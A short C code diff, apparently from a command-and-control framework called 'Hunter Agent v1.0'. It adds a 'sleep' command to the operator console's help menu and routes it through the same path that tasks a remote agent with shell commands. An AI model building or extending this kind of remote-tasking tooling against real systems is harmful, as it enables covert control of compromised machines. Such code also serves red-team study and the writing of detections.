@@ -235,7 +235,7 @@ void *Socket_Writer()
 		fflush(NULL);
 	}
 	else if(strcmp(newline_terminator(buffer), "help\n") == 0){
-		printf("\n\t  Hunter Agent v1.0 Commands\n-------------------------------------------\nshell <command> - task the agent to run a command\nhelp - displays this menu\nbg - backgrounds the agent command session\nexit - tasks the agent to exit\n\n");
+		printf("\n\t  Hunter Agent v1.0 Commands\n-------------------------------------------\nshell <command> - task the agent to run a command\nsleep <seconds> - task the agent to sleep for a specified time\nhelp            - displays this menu\nbg              - backgrounds the agent command session\nexit            - tasks the agent to exit\n\n");
 
 		printf("beacon> ");
 		fflush(NULL);
@@ -269,7 +269,7 @@ void *Socket_Writer()
 
 	else {
 
-	    if(str_starts_with(buffer, "shell") == 0){ 	
+	    if(str_starts_with(buffer, "shell") == 0 || str_starts_with(buffer, "sleep") == 0){ 	
 	    
 	    	printf("\n\e[1;32m[+]\e[0m Tasking agent with command\n");
 	   	a.beaconbufsize = n;
